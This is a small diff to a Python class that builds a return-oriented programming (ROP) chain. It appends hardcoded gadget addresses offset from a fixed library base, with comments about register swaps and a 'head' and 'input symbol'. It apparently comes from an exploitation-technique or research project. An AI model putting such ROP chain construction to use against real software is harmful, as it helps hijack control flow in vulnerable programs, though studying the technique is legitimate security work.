@@ -151,6 +151,7 @@ class ROP:
         self.swp_regs("edx", "edi")     #edx has head, edi has input symbol
 
 #-- NEW STUFF
+
         self.swp_regs("edx", "esi")     #edx is trashed, esi has head
         self.xchg_w_eax("edx") #xchg eax, edx - where edx = input symbol 
         self.arr += (0x00030139 + 0xb7dec000).to_bytes(4, byteorder='little') #0x00030139 : mov eax, ecx ; ret - where eax = count
@@ -159,7 +160,8 @@ class ROP:
 
         #self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')   #sub eax, ecx ; ret
         #self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')   # neg eax ; ret
-        self.zero_out_reg("esi")
+        self.pop_register("esi", 0)
+        self.arr += (0).to_bytes(4, byteorder='little')
         self.arr += (0x0007773c + 0xb7dec000).to_bytes(4, byteorder='little')   # add with carry (adc reg, reg) ; ret
         self.xchg_w_eax("esi")
         self.negate_reg("eax")
